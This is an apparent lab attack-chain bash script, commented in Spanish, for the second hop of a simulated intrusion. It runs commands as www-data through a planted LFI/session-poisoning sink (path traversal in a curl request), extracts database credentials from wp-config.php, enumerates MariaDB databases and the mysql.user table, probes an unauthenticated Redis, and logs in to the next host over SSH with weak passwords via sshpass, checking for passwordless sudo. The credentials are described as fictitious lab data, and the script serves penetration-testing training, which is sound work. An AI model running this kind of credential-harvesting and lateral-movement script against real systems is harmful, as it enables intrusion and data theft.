#!/usr/bin/env bash
# ============================================================================
#  lab/chain/02-m1-to-m2.sh — salto 2: M1 (www-data) → M2 (base de datos)
# ----------------------------------------------------------------------------
#  Con ejecución como www-data en M1:
#    · leer /var/www/wp/wp-config.php (host/usuario/clave de la BD)
#    · conectarse a MariaDB en 10.10.10.12 con wp_user/ClaveDebil123
#    · enumerar bases y tablas
#    · entrar por SSH con adminm2/adminm2
#
#  Canal de ejecución en M1 (con --run):
#    lfi  (def.) usa el sink LFI sembrado por 01 (WS_SID en $LAB_STATE).
#         Es el camino real: los comandos corren como www-data.
#    ssh  fallback de demo: SSH ubuntu@M1 + `sudo -u www-data`.
#         Sólo con LAB_ALLOW_SSH=1 y dejando claro en el informe que es atajo.
#
#  Uso:
#    bash lab/chain/02-m1-to-m2.sh                  # imprime comandos
#    bash lab/chain/02-m1-to-m2.sh --run            # ejecuta como www-data
#    bash lab/chain/02-m1-to-m2.sh --run --sid lab123
#
#  Credenciales de laboratorio (lab/README.md §6), datos ficticios.
# ============================================================================

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_ARTIFACTS="${LAB_ARTIFACTS:-$LAB_REPO_DIR/artifacts}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_ARTIFACTS LAB_LOG

# shellcheck source=../common/lib.sh
. "$HERE/../common/lib.sh"

LAB_ROLE=chain
STATE="${LAB_STATE:-${TMPDIR:-/tmp}/lab-chain.env}"
# Estado del salto anterior (WS_SID de 01). Es un archivo local de la demo.
if [[ -f "$STATE" ]]; then . "$STATE"; fi

RUN=0
CHAN="${LAB_CHAN:-auto}"
WS_SID="${WS_SID:-}"
LFI_URL="${LFI_URL:-https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php}"

M1_SSH_USER="${M1_SSH_USER:-ubuntu}"
M1_SSH_PASS="${M1_SSH_PASS:-Admin13.-}"
M2_USER="${M2_USER:-adminm2}"
M2_PASS="${M2_PASS:-adminm2}"
DB_HOST="${DB_HOST:-$M2}"
DB_USER="${DB_USER:-wp_user}"
DB_PASS="${DB_PASS:-ClaveDebil123}"
WPCONFIG="${WPCONFIG:-/var/www/wp/wp-config.php}"

usage() {
  cat <<'EOF'
Uso: bash lab/chain/02-m1-to-m2.sh [opciones]

  --run          ejecutar (def. solo imprime)
  --sid SID      PHPSESSID sembrado por 01 (si no está en el estado)
  --chan lfi|ssh canal de ejecución en M1 (def. auto: lfi)
  -h, --help     esta ayuda

Fallback de demo (no es el camino real):
  LAB_ALLOW_SSH=1 bash lab/chain/02-m1-to-m2.sh --run --chan ssh
EOF
}

while (($#)); do
  case "$1" in
    --run)      RUN=1; shift ;;
    --sid)      WS_SID="${2:?--sid necesita un valor}"; shift 2 ;;
    --sid=*)    WS_SID="${1#*=}"; shift ;;
    --chan)     CHAN="${2:?--chan necesita lfi|ssh}"; shift 2 ;;
    --chan=*)   CHAN="${1#*=}"; shift ;;
    -h|--help)  usage; exit 0 ;;
    *) die "opción desconocida: $1 (ver --help)" ;;
  esac
done

resolve_chan() {
  case "$CHAN" in
    lfi|ssh) printf '%s\n' "$CHAN" ;;
    auto)
      if [[ -n "$WS_SID" ]]; then printf 'lfi\n'
      elif [[ "${LAB_ALLOW_SSH:-0}" == 1 ]]; then printf 'ssh\n'
      else printf 'none\n'; fi ;;
    *) die "--chan solo acepta lfi, ssh o auto" ;;
  esac
}

ww_lfi() {
  local sid="$1" cmd="$2"
  curl -sk --max-time 30 -G "$LFI_URL" \
    --data-urlencode "file=../../../../../../tmp/sess_${sid}" \
    --data-urlencode "c=${cmd}"
}

ww_ssh() {
  local cmd="$1"
  command -v sshpass >/dev/null 2>&1 || die "falta sshpass (lo instala lab/m6/install.sh)"
  sshpass -p "$M1_SSH_PASS" ssh \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "$M1_SSH_USER@$M1" "sudo -u www-data -H bash -c $(printf '%q' "$cmd")"
}

# --------------------------------------------------------------- objetivo
lab_banner
step "salto 2 · M1 (${M1}, www-data) → M2 (${M2})"
cat <<EOF
Objetivo: convertir www-data en M1 en acceso a los datos y a una cuenta SSH
de M2.

  a) loot de configuración   → $WPCONFIG
  b) MariaDB 10.11 en $M2:3306 → $DB_USER/$DB_PASS
  c) SSH                    → $M2_USER/$M2_PASS (sudo sin clave después)
EOF

# --------------------------------------------------------------- comandos
step "comandos exactos (como www-data en M1)"
cat <<EOF
  # a) configuración de WordPress → credenciales de la BD
  cat $WPCONFIG
  grep -E "DB_(NAME|USER|PASSWORD|HOST)" $WPCONFIG

  # b) MariaDB con esas credenciales (pre-auth desde la LAN, :3306 abierto)
  mysql -h $M2 -u $DB_USER -p'$DB_PASS' -e 'SHOW DATABASES;'
  mysql -h $M2 -u $DB_USER -p'$DB_PASS' -e 'SHOW TABLES;' wp_db
  mysql -h $M2 -u $DB_USER -p'$DB_PASS' -e 'SELECT user,host FROM mysql.user;'

  # extra documentado: Redis 6.2.6 sin autenticación
  redis-cli -h $M2 info server | head -5

  # c) SSH con credenciales débiles
  ssh $M2_USER@$M2        # $M2_USER/$M2_PASS -> sudo -n id = root
EOF

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se ejecuta nada. Para ejecutar: --run\n' >&2
  [[ -n "$WS_SID" ]] || printf '  (no hay WS_SID en %s: correr 01 --run o pasar --sid)\n' "$STATE" >&2
  exit 0
fi

# --------------------------------------------------------------- ejecución
CH="$(resolve_chan)"
if [[ "$CH" == none ]]; then
  die "sin canal en M1: correr '01-m1-php2shell.sh --run' (entry-b) o usar --sid.
  Atajo de demo: LAB_ALLOW_SSH=1 ... --chan ssh"
fi
ok "canal de ejecución en M1: $CH"

step "a) lectura de $WPCONFIG como www-data"
cfg=""
if [[ "$CH" == lfi ]]; then
  cfg="$(ww_lfi "$WS_SID" "cat $WPCONFIG" || true)"
else
  warn "fallback SSH: el comando corre con 'sudo -u www-data', NO es el camino real"
  cfg="$(ww_ssh "cat $WPCONFIG" || true)"
fi

if [[ -z "$cfg" ]]; then
  warn "respuesta vacía; revisar el sink o el SID"
else
  printf '%s\n' "$cfg" | grep -E "DB_(NAME|USER|PASSWORD|HOST)" | sed 's/^[[:space:]]*//' || warn "sin líneas DB_* en la respuesta"
  # Se capturan los valores reales del archivo para no asumirlos.
  for k in DB_NAME DB_USER DB_PASSWORD DB_HOST; do
    v=$(printf '%s\n' "$cfg" | sed -n "s/.*'$k'[^']*'\([^']*\)'.*/\1/p" | head -n 1)
    case "$k" in
      DB_NAME)     if [[ -n "$v" ]]; then DB_NAME_REAL="$v"; fi ;;
      DB_USER)     if [[ -n "$v" ]]; then DB_USER="$v"; fi ;;
      DB_PASSWORD) if [[ -n "$v" ]]; then DB_PASS="$v"; fi ;;
      DB_HOST)     if [[ -n "$v" ]]; then DB_HOST="$v"; fi ;;
    esac
  done
  ok "credenciales de BD extraídas de wp-config.php"
  printf '  host=%s user=%s db=%s\n' "$DB_HOST" "$DB_USER" "${DB_NAME_REAL:-wp_db}" >&2
fi

step "b) MariaDB en $DB_HOST"
q_dbs="mysql -h $DB_HOST -u $DB_USER -p'$DB_PASS' -e 'SHOW DATABASES;'"
q_tbl="mysql -h $DB_HOST -u $DB_USER -p'$DB_PASS' -e 'SHOW TABLES;' ${DB_NAME_REAL:-wp_db}"
if [[ "$CH" == lfi ]]; then
  # El atacante no tiene cliente mysql en M6: ejecuta el cliente de M1 vía el sink.
  ww_lfi "$WS_SID" "$q_dbs" || warn "consulta de bases falló vía LFI"
  ww_lfi "$WS_SID" "$q_tbl" || warn "consulta de tablas falló vía LFI"
elif command -v mysql >/dev/null 2>&1; then
  export MYSQL_PWD="$DB_PASS"
  mysql -h "$DB_HOST" -u "$DB_USER" --connect-timeout=8 -e 'SHOW DATABASES;' \
    || warn "no se pudo listar bases (¿M2 arriba? ¿credenciales? ¿3306 expuesto?)"
  mysql -h "$DB_HOST" -u "$DB_USER" --connect-timeout=8 \
    -e "SHOW TABLES;" "${DB_NAME_REAL:-wp_db}" 2>/dev/null \
    || warn "no se pudieron listar tablas de ${DB_NAME_REAL:-wp_db}"
  unset MYSQL_PWD
else
  warn "sin canal LFI ni cliente mysql en M6"
fi

step "c) SSH a M2 con $M2_USER"
if command -v sshpass >/dev/null 2>&1; then
  sshpass -p "$M2_PASS" ssh \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "$M2_USER@$M2" 'id; hostname; sudo -n id' \
    || warn "SSH falló: revisar credenciales/servicio en M2"
else
  warn "falta sshpass"
fi

step "siguiente salto"
printf '  bash %s/03-m2-to-m3.sh --run\n' "$HERE" >&2
